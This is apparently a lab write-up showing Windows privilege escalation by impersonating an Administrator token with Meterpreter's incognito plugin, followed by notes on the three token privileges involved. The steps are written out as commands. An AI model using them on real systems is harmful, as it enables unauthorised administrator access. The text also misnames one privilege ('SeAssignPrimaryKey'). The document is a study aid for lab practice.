Let's see how to perform Privilege Escalation with Impersonate Access Token (Windows)
# Introduction of Privilage Escalation with impersonate access Token
Privilege Escalation Impersonate Access Token on Windows is a technique that allows a user with certain privileges to execute commands as another user, usually with higher privileges, by stealing and impersonating their security token. A security token is an object that contains the identity and permissions of a user or process in Windows.<br>
There are two privileges that can be exploited for this technique: SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege. These privileges allow a user to impersonate a token, but not create it. A privileged token can be obtained from a Windows service that performs an NTLM authentication against the attacker, who can then relay the token and use it to run a process as the target user.

## Privilage Escalation(Windows) Impersonate access Token
### We start with an initial access (Meterpreter session)
#### Let's check that we can't read a file.txt
 - cat C:\\Users\\Administrator\\Desktop\\flag.txt <br>
<img src="file.png" width=60% height="auto"><br>
#### Check the user privilages, we need SeAssignPrimaryKey, SeCreateToken e SeImpersonatePrivilage
 - getprivs <br>
<img src="privs.png" width=60% height="auto"><br>
#### We cannot read the flag with current privilege. The flag is located into the Administratorâ€™s Desktop folder. Load incognito plugin and check all available tokens.
 - load incognito
 - list_tokens -u <br>
<img src="token.png" width=60% height="auto"><br>
#### We can notice that the Administrator user token is available. we will Impersonate the Administrator user token to read the file.txt
 - impersonate_token ATTACKDEFENSE\\Administrator 
 - getuid
 - cat C:\\Users\\Administrator\\Desktop\\flag.txt <br>
<img src="impersonate.png" width=60% height="auto"><br>

### Why we need these privileges?
To perform this technique we must have these privilages SeAssignPrimaryKey, SeCreateToken e SeImpersonatePrivilage. <br>
Use the command getprivs to check it. <br>
These three privileges are related to the security settings of Windows that allow a program to act on behalf of a user or another account. According to the web search results, here is a brief explanation of each privilege:

1. **SeAssignPrimaryTokenPrivilege:** This privilege allows a process to replace its own primary token with another token. This is typically used by services that need to run under different user accounts.
2. **SeCreateTokenPrivilege:** This privilege allows a process to create an access token, which can then be used to impersonate any user or account. This is a very powerful and dangerous privilege that should be granted only to trusted programs.
3. **SeImpersonatePrivilege:** This privilege allows a process to impersonate a client that has been authenticated by the same process or a process that shares the same logon session. This is commonly used by client/server applications that need to access resources on behalf of the client. <br>
These privileges are required to perform and impersonate access tokens because they enable a program to change its security context and access the objects that the user or account has permission to.
